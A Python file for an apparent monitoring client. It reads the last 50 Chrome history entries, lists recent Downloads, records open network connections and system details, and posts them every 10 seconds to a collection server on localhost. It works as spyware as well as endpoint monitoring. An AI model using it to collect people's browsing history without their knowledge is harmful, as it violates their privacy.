import os
import sqlite3
import requests
import time
import platform
import socket
import psutil
import shutil
from datetime import datetime

# Conditional import for Windows-only modules
if platform.system() == 'Windows':
    import winreg

# Configuration
SERVER_URL = "http://localhost:5000/api/report"
CLIENT_ID = f"{socket.gethostname()}-{platform.node()}"
REPORT_INTERVAL = 10  # seconds

def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "processor": platform.processor(),
        "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "last_boot": datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
    }

def get_network_connections():
    connections = []
    net_io = psutil.net_io_counters(pernic=True)  # Get network I/O per interface

    for conn in psutil.net_connections(kind='inet'):
        if conn.status == 'ESTABLISHED' and conn.raddr:
            interface = None
            for nic, addrs in psutil.net_if_addrs().items():
                if any(addr.address == conn.laddr.ip for addr in addrs):
                    interface = nic
                    break
            
            sent_bytes = net_io[interface].bytes_sent if interface and interface in net_io else 0
            recv_bytes = net_io[interface].bytes_recv if interface and interface in net_io else 0

            connections.append({
                "protocol": "TCP",
                "remote_ip": conn.raddr.ip,
                "port": conn.raddr.port,
                "status": conn.status,
                "pid": conn.pid,
                "interface": interface,
                "sent_bytes": sent_bytes,
                "received_bytes": recv_bytes
            })
    return connections

def get_downloads():
    if platform.system() == 'Windows':
        downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
    else:
        downloads_path = os.path.expanduser('~/Downloads')
    
    if not os.path.exists(downloads_path):
        return []
    
    files = []
    for f in os.listdir(downloads_path):
        full_path = os.path.join(downloads_path, f)
        if os.path.isfile(full_path):
            stat = os.stat(full_path)
            files.append({
                'filename': f,
                'path': full_path,
                'size': f"{round(stat.st_size / (1024*1024), 2)} MB",
                'download_time': datetime.fromtimestamp(stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S')
            })
    
    return sorted(files, key=lambda x: x['download_time'], reverse=True)[:20]

def get_visited_sites():
    return get_windows_browser_history() if platform.system() == 'Windows' else get_linux_browser_history()

def get_windows_browser_history():
    history = []
    
    try:
        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
        if os.path.exists(chrome_path):
            temp_path = chrome_path + "_temp"
            shutil.copy2(chrome_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'time': datetime.fromtimestamp(row[2] / 1000000 - 11644473600).strftime('%Y-%m-%d %H:%M:%S')
                })
            conn.close()
            os.remove(temp_path)
    except Exception as e:
        print(f"Error fetching Chrome history: {e}")
    return history

def get_linux_browser_history():
    history = []
    
    browsers = {
        "chrome": os.path.expanduser("~/.config/google-chrome/Default/History"),
        "firefox": os.path.expanduser("~/.mozilla/firefox")
    }
    
    def fetch_chrome_history(db_path):
        if os.path.exists(db_path):
            try:
                temp_db = db_path + "_temp"
                shutil.copy2(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_db)
                
                for row in rows:
                    history.append({
                        'url': row[0],
                        'title': row[1],
                        'time': datetime.fromtimestamp(row[2] / 1000000 - 11644473600).strftime('%Y-%m-%d %H:%M:%S')
                    })
            except Exception as e:
                print(f"Error fetching Chrome history: {e}")
    
    fetch_chrome_history(browsers["chrome"])
    return history

def collect_activity():
    return {
        "client_id": CLIENT_ID,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "system_info": get_system_info(),
        "visited_sites": get_visited_sites(),
        "downloaded_files": get_downloads(),
        "network_activity": get_network_connections()
    }

def send_report():
    data = collect_activity()
    try:
        response = requests.post(SERVER_URL, json=data)
        if response.status_code == 200:
            print(f"Report sent successfully at {datetime.now()}")
        else:
            print(f"Failed to send report: {response.text}")
    except Exception as e:
        print(f"Error sending report: {e}")

if __name__ == '__main__':
    print(f"Client started. ID: {CLIENT_ID}")
    print(f"Reporting to server every {REPORT_INTERVAL} seconds")
    
    while True:
        send_report()
        time.sleep(REPORT_INTERVAL)
